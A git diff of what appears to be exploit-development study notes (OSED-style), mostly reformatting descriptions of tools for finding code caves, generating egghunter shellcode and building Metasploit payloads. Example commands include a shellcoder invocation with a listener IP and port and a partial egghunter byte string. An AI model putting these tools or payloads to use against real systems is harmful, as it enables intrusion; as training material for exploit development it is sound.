@@ -49,8 +49,8 @@ python3 filter-ropfile.py rop.txt
 
 
 ## Code-caver.py
-Can used for finding code cave (a RX location of bunch of 0s)
-From noptech Github repository (https://raw.githubusercontent.com/nop-tech/code_caver/main/code_caver.py)
+* Can used for finding code cave (a RX location of bunch of 0s)
+* From noptech Github repository (https://raw.githubusercontent.com/nop-tech/code_caver/main/code_caver.py)
 ```
 0:000> !py code_caver.py 55100000 55107000 
 Code Caver
@@ -64,8 +64,8 @@ Code Caver
 
 
 ## Egghunter.py
-Can used for crafting egghunter shellcode
-From epi052 Github repository (https://raw.githubusercontent.com/epi052/osed-scripts/main/egghunter.py)
+* Can used for crafting egghunter shellcode
+* From epi052 Github repository (https://raw.githubusercontent.com/epi052/osed-scripts/main/egghunter.py)
 ```
 └─$ python3 egghunter.py -t GFHKGFHK -b \x00\x09\x0A
 [+] Egghunter assembly code + coresponding bytes
@@ -104,8 +104,9 @@ egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x
 
 
 ## shellcoder.py 
-Used for creating MSF payload. Very useful to create small payload
-From epi052 Github repository (https://raw.githubusercontent.com/epi052/osed-scripts/main/shellcoder.py)
+* Used for creating MSF payload. Very useful to create small payload
+* Rmb to use the MSF shellcode template to remove bad chars manually rather than using Metasploit
+* From epi052 Github repository (https://raw.githubusercontent.com/epi052/osed-scripts/main/shellcoder.py)
 ```
 python3 shellcoder.py --msi -l 192.168.56.142 -p 443 -s
    start:                               
